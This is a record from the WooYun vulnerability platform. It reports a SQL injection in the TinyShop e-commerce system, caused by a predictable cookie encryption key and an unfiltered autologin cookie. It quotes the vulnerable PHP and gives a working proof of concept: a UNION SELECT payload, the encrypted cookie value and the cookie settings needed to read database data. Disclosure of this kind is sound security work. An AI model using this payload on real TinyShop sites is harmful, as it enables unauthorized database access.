{"id": 51290, "wybug_id": "wooyun-2014-075082", "wybug_title": "tinyshop cookie注入", "wybug_corp": "tinyrise.com", "wybug_author": "路人甲", "wybug_date": "2014-09-09 12:33", "wybug_open_date": "2014-12-05 12:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-14：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-05：\t细节向公众公开  简要描述： cookie没有过滤导致sql注入 详细说明：  首先看cookie的加密：\n///加解密算法private static function code($string, $op=\"decode\", $key='', $expiry=0)///加密算法调用：$value = Crypt::encode($value,self::getSafeCode());///解密算法的调用：$cookie= Crypt::decode($cryptCookie,self::getSafeCode());\n这里的关键就是self::getSafeCode()\npublic static function getSafeCode(){\tif(self::$safeCode == '')self::setSafeCode();\treturn self::$safeCode;}public static function setSafeCode($scode=''){\tself::$safeCode = $scode.self::cookieId();}private static function cookieId()\t{\tif(self::$safeLave==0)return 1;\tif(self::$safeLave==1) return md5(Chips::getIP());\tif(self::$safeLave==2) return md5(Chips::getIP().$_SERVER[\"HTTP_USER_AGENT\"]);\t}\n这就说明 整个cookie的加密秘钥无非是三种情况，而且这三种都是用户可以获取的。而且默认就是第一种方式，也就是key=1.在来看方法：（classes/common.php)\n//自动登录时的用户信息    static function autoLoginUserInfo()    {        $cookie = new Cookie();        $cookie->setSafeCode(Tiny::app()->getSafeCode());        $autologin = $cookie->get('autologin');        $obj = null;        if($autologin!=null){            $email = $autologin['email'];            $password = $autologin['password'];            $model = new Model(\"user as us\");            $obj = $model->join(\"left join customer as cu on us.id = cu.user_id\")->fields(\"us.*,cu.group_id,cu.login_time\")->where(\"us.email='$email'\")->find();            if($obj['password'] != $password){                $obj = null;            }        }        return $obj;    }\n这里获取了autologin 这个cookie值，再来看获取方式：\npublic static function get($name)\t{\t\tif(self::checkSafe()==1)\t\t{\t\t\tif(isset($_COOKIE[self::$per.$name]))\t\t\t{\t\t\t\t$cryptCookie = $_COOKIE[self::$per.$name];\t\t\t\t$cookie= Crypt::decode($cryptCookie,self::getSafeCode());\t\t\t\t$tem = substr($cookie,0,10);\t\t\t\tif(preg_match('/^[Oa]:\\d+:.*/',$tem)) $cookie = unserialize($cookie);\t\t\t\treturn $cookie;\t\t\t}\t\t\treturn null;\t\t}\t\tif(self::checkSafe()==0) self::clear($name);// Tiny::msg('非法窃取COOKIE，系统将终止工作！',0);\t\telse return null;\t}\n在这里看到cookie只是在解密后做了一次反序列换转换，这就导致了直接被带入到了后端的sql语句中。这里以默认的$key=1作为poc例子：注入的sql语句片段式: ' union select 1,user(),1,1,1,1,1,1,1#序列化后加密得到密文：bfc8bbdb4aOTkwMDQwMDMxMzkxNGY/MDRkZDBhZjIzPGE4MWA0NzVhOjE9e3EyNTgibW1gbGwiOXI8MzE6KyMgdW5pbm4gc2VtZWN9IjgpdXpley0hLDEuNyoxJTcuMikxKjEjKzt3Ojg6J3lkcHV/bHNkIjtzODE6IjAmOH0设置cookie：    safecode=1,Tiny_autologin=bfc8bbdb4aOTkwMDQwMDMxMzkxNGY/MDRkZDBhZjIzPGE4MWA0NzVhOjE9e3EyNTgibW1gbGwiOXI8MzE6KyMgdW5pbm4gc2VtZWN9IjgpdXpley0hLDEuNyoxJTcuMikxKjEjKzt3Ojg6J3lkcHV/bHNkIjtzODE6IjAmOH0然后访问首页即可看到用户名\n\n\n\n\n\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  你们比我专业   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-05 12:34 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}